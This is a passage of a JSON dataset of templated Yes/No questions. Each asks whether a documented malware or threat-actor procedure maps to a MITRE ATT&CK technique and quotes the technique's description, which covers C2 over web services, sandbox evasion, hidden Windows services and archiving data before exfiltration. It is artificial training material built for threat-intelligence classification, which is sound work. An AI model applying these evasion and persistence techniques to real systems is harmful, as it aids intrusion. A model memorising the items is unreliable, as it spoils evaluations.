    "instruction": "Background Web Service: Bidirectional Communication: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection..\nQ: Is procedure BLACKCOFFEE has also obfuscated its C2 traffic as normal traffic to sites such as Github.  related to technique Command and Scripting Interpreter: Unix Shell.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Web Service: Bidirectional Communication",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Web Service: Bidirectional Communication: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "question": "Is procedure BLACKCOFFEE has also obfuscated its C2 traffic as normal traffic to sites such as Github.  related to technique Command and Scripting Interpreter: Unix Shell",
      "yes/no": "No.\nThe correct answer is Web Service: Bidirectional Communication",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Ursnif has used an XOR-based algorithm to encrypt Tor clients dropped to disk.\tUrsnif droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands. a type of technique Obfuscated Files or Information: Encrypted/Encoded File",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Encrypted/Encoded File: Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "question": "Is procedure Ursnif has used an XOR-based algorithm to encrypt Tor clients dropped to disk.\tUrsnif droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands. a type of technique Obfuscated Files or Information: Encrypted/Encoded File",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure SUNBURST source code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added to SUNSPOT. a type of technique Obfuscated Files or Information: Indicator Removal from Tools",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Obfuscated Files or Information: Indicator Removal from Tools: Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
      "question": "Is procedure SUNBURST source code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added to SUNSPOT. a type of technique Obfuscated Files or Information: Indicator Removal from Tools",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications..\nAnswer in Yes or No.\n\nQuestion: Is procedure MacMa has used a custom JSON-based protocol for its C&C communications. a type of technique Cloud Service Discovery",
    "context": "",
    "output": "No.\nThe correct answer is Non-Application Layer Protocol",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Non-Application Layer Protocol: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "question": "Is procedure MacMa has used a custom JSON-based protocol for its C&C communications. a type of technique Cloud Service Discovery",
      "yes/no": "No.\nThe correct answer is Non-Application Layer Protocol",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Virtualization/Sandbox Evasion: System Checks: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices..\nAnswer in Yes or No.\n\nQuestion: Is procedure During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services. a type of technique Command and Scripting Interpreter: PowerShell",
    "context": "",
    "output": "No.\nThe provided context is correlated with Virtualization/Sandbox Evasion: System Checks",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Virtualization/Sandbox Evasion: System Checks: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
      "question": "Is procedure During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services. a type of technique Command and Scripting Interpreter: PowerShell",
      "yes/no": "No.\nThe provided context is correlated with Virtualization/Sandbox Evasion: System Checks",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor. a type of technique Hide Artifacts: Hidden Files and Directories.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Boot or Logon Autostart Execution: Shortcut Modification",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Boot or Logon Autostart Execution: Shortcut Modification: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
      "question": "Is procedure Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor. a type of technique Hide Artifacts: Hidden Files and Directories",
      "yes/no": "No.\nThe provided context is related to Boot or Logon Autostart Execution: Shortcut Modification",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Create or Modify System Process: Windows Service: Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via Native API functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\n\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., Hide Artifacts), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`..\nAnswer in Yes or No.\n\nQuestion: Is procedure DarkVishnya created new services for shellcode loaders distribution.  related to technique Command and Scripting Interpreter: JavaScript",
    "context": "",
    "output": "No.\nThe provided context is correlated with Create or Modify System Process: Windows Service",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Create or Modify System Process: Windows Service: Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via Native API functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\n\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., Hide Artifacts), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.",
      "question": "Is procedure DarkVishnya created new services for shellcode loaders distribution.  related to technique Command and Scripting Interpreter: JavaScript",
      "yes/no": "No.\nThe provided context is correlated with Create or Modify System Process: Windows Service",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Kimsuky has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims. a type of technique OS Credential Dumping: LSA Secrets",
    "context": "",
    "output": "No.\nThe correct answer is Search Open Websites/Domains: Search Engines",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Search Open Websites/Domains: Search Engines: Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Valid Accounts or Phishing).",
      "question": "Is procedure Kimsuky has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims. a type of technique OS Credential Dumping: LSA Secrets",
      "yes/no": "No.\nThe correct answer is Search Open Websites/Domains: Search Engines",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).  related to technique Proxy: External Proxy.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Proxy: External Proxy: Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap.  Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
      "question": "Is procedure MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).  related to technique Proxy: External Proxy",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Software Discovery: Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation..\nAnswer in Yes or No.\n\nQuestion: Is procedure SVCReady can collect a list of installed software from an infected host.  related to technique Software Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Software Discovery: Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
      "question": "Is procedure SVCReady can collect a list of installed software from an infected host.  related to technique Software Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next..\nAnswer in Yes or No.\n\nQuestion: Is procedure Backdoor.Oldrea collects information about the Internet adapter configuration. a type of technique System Network Configuration Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Network Configuration Discovery: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "question": "Is procedure Backdoor.Oldrea collects information about the Internet adapter configuration. a type of technique System Network Configuration Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded. a type of technique Archive Collected Data: Archive via Utility",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Archive Collected Data: Archive via Utility: Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. Remote Data Staging). <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",
      "question": "Is procedure MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded. a type of technique Archive Collected Data: Archive via Utility",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Application Layer Protocol: Mail Protocols: Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic..\nAnswer in Yes or No.\n\nQuestion: Is procedure JPIN can send email over SMTP.  related to technique Gather Victim Identity Information: Email Addresses",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Layer Protocol: Mail Protocols: Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "question": "Is procedure JPIN can send email over SMTP.  related to technique Gather Victim Identity Information: Email Addresses",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Query Registry: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions..\nAnswer in Yes or No.\n\nQuestion: Is procedure gh0st RAT has checked for the existence of a Service key to determine if it has already been installed on the system.  related to technique Query Registry",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Query Registry: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "question": "Is procedure gh0st RAT has checked for the existence of a Service key to determine if it has already been installed on the system.  related to technique Query Registry",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Web Service: Bidirectional Communication: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection..\nQ: Is procedure DOGCALL is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2. a type of technique Boot or Logon Autostart Execution: Security Support Provider.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Web Service: Bidirectional Communication",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Web Service: Bidirectional Communication: Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "question": "Is procedure DOGCALL is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2. a type of technique Boot or Logon Autostart Execution: Security Support Provider",
      "yes/no": "No.\nThe provided context is related to Web Service: Bidirectional Communication",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Gather Victim Identity Information: Email Addresses: Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services)..\nQ: Is procedure APT32 has collected e-mail addresses for activists and bloggers in order to target them with spyware.  related to technique Account Discovery: Domain Account.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Gather Victim Identity Information: Email Addresses",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Gather Victim Identity Information: Email Addresses: Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Email addresses could also be enumerated via more active means (i.e. Active Scanning), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system. For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Email Accounts), and/or initial access (ex: Phishing or Brute Force via External Remote Services).",
      "question": "Is procedure APT32 has collected e-mail addresses for activists and bloggers in order to target them with spyware.  related to technique Account Discovery: Domain Account",
      "yes/no": "No.\nThe provided context is correlated with Gather Victim Identity Information: Email Addresses",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Service Discovery: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions..\nAnswer in Yes or No.\n\nQuestion: Is procedure BitPaymer can enumerate existing Windows services on the host that are configured to run as LocalSystem. a type of technique System Service Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
